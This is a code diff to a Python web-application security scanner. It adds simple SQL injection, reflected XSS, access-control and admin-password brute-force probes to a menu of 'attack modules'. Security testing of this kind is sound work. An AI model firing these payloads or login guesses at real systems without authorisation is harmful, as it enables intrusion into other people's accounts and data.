@@ -45,30 +45,71 @@ def log_report(test_name, outcome, details=""):
 # Banner
 def display_splash_screen():
     splash = """
- __      __        ___.                                  _________                           .__   __                ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
-/  \    /  \  ____ \_ |__ _____   ______  ______        /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
-\   \/\/   /_/ __ \ | __ \\__  \  \____ \ \____ \       \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
- \        / \  ___/ | \_\ \/ __ \_|  |_> >|  |_> >      /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
-  \__/\  /   \___  >|___  (____  /|   __/ |   __/______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
-       \/        \/     \/     \/ |__|    |__|  /_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
+    __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
+    /  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
+    \   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
+    \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
+    \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
+           \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
 
 
     """
     print(splash)
     print("Web_Application_Security_Framework 41PH4-01\n")
 
-# Columnar Display Helper Function
-def display_in_columns(options, column_count=2):
+# Columnar Display Helper Function (no row limit)
+def display_in_columns(options):
     max_length = max(len(option) for option in options)
     formatted_options = [
         f"[{index+1}] {option:<{max_length}}" 
         for index, option in enumerate(options)
     ]
-    for i in range(0, len(formatted_options), column_count):
-        print("    ".join(formatted_options[i:i + column_count]))
+    print("    ".join(formatted_options))
 
 # Attack Modules
 
+def test_sql_injection(url, param_name):
+    payload = "' OR 1=1 --"
+    data = {param_name: payload}
+    response = SESSION.post(url, data=data, headers=HEADERS)
+
+    if "error" in response.text or "syntax" in response.text:
+        log_report("SQL Injection", "Vulnerable", "SQL Injection vulnerability detected.")
+    else:
+        log_report("SQL Injection", "Not Vulnerable", "No SQL Injection detected.")
+
+def test_brute_force_login(url, username_param, password_param):
+    common_passwords = ["123456", "password", "admin"]
+    for password in common_passwords:
+        data = {username_param: "admin", password_param: password}
+        response = SESSION.post(url, data=data, headers=HEADERS)
+
+        if "success" in response.text:  # Adjust based on the login success indicator
+            log_report("Brute Force", "Vulnerable", f"Login bypass with password: {password}")
+            break
+        else:
+            log_report("Brute Force", "Not Vulnerable", "No password bypass detected.")
+
+def test_reflected_xss(url, param_name):
+    payload = "<script>alert('XSS')</script>"
+    data = {param_name: payload}
+    response = SESSION.post(url, data=data, headers=HEADERS)
+
+    if payload in response.text:
+        log_report("Reflected XSS", "Vulnerable", "Reflected XSS vulnerability detected.")
+    else:
+        log_report("Reflected XSS", "Not Vulnerable", "No reflected XSS detected.")
+
+def test_access_control(url, param_name):
+    unauthorized_url = f"{url}/{param_name}/restricted"
+    response = SESSION.get(unauthorized_url, headers=HEADERS)
+
+    if response.status_code == 403:
+        log_report("Access Control", "Not Vulnerable", "Access control is functioning.")
+    else:
+        log_report("Access Control", "Vulnerable", "Access control failure detected.")
+
+# Race Condition (TOCTOU)
 def test_race_condition(url, param_name, value):
     def send_request():
         data = {param_name: value}
@@ -87,6 +128,7 @@ def test_race_condition(url, param_name, value):
     for thread in threads:
         thread.join()
 
+# Business Logic Test
 def test_business_logic(url, param_name):
     params = {param_name: "discount_code"}
     response = SESSION.get(url, params=params, headers=HEADERS)
@@ -96,26 +138,19 @@ def test_business_logic(url, param_name):
     else:
         log_report("Business Logic", "Not Vulnerable", "No business logic vulnerability detected")
 
-# Other tests would have similar changes:
-# - Call `log_report()` at the end of each test function to record the results.
-
 # Main Menu
 def display_main_menu():
     print(f"\n{Fore.TEAL}Main Menu:{Style.RESET_ALL}")
     options = [
+        "SQL Injection", 
+        "Brute Force Login", 
+        "Reflected XSS", 
+        "Access Control", 
         "Race Condition (TOCTOU)", 
         "Business Logic Vulnerability", 
-        "User Enumeration", 
-        "HTTP Smuggling", 
-        "Reflected File Download", 
-        "Account Takeover", 
-        "Blind SSRF", 
-        "Memory Corruption", 
-        "Subdomain Takeover", 
-        "CORS Misconfiguration", 
         "Exit"
     ]
-    display_in_columns(options, column_count=3)
+    display_in_columns(options)
 
 # Main Script
 def main():
@@ -128,11 +163,18 @@ def main():
             choice = int(input(f"Choose an option (1-{len(options)}): "))
 
             if choice == 1:
-                test_race_condition(TARGET_URL, "param_name", "value")
+                test_sql_injection(TARGET_URL, "param_name")
             elif choice == 2:
+                test_brute_force_login(TARGET_URL, "username", "password")
+            elif choice == 3:
+                test_reflected_xss(TARGET_URL, "param_name")
+            elif choice == 4:
+                test_access_control(TARGET_URL, "param_name")
+            elif choice == 5:
+                test_race_condition(TARGET_URL, "param_name", "value")
+            elif choice == 6:
                 test_business_logic(TARGET_URL, "param_name")
-            # Add calls for other tests here with logging...
-            elif choice == 11:
+            elif choice == 7:
                 print("Exiting...")
                 break
             else:
